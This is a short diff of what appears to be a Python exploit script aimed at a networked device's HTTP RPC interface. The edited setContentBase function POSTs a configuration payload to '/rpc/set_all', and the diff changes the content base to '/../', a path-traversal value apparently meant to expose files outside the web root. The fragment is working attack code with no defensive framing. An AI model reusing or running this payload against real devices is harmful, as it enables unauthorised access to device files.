@@ -32,7 +32,7 @@ def checkPort(host, port):
                 return False
 
 def setContentBase(host, port):
-        payload = "\ncontentbase=/\n"
+        payload = "\ncontentbase=/../\n"
         url = "http://{0}:{1}/rpc/set_all".format(host, port)
         try:
                 response = requests.post(url, data=payload, timeout=5)
